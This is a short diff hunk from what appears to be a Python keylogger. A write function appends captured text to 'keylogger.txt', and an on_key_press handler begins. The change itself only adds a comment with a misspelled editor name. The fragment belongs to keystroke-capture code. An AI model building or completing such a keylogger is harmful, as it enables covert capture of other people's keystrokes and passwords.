@@ -14,7 +14,7 @@ def write(text):
     with open("keylogger.txt",'a') as f:
         f.write(text)
         f.close()
-
+#for better dataflow understanding use pychare
 
 def on_key_press(Key):
     try:
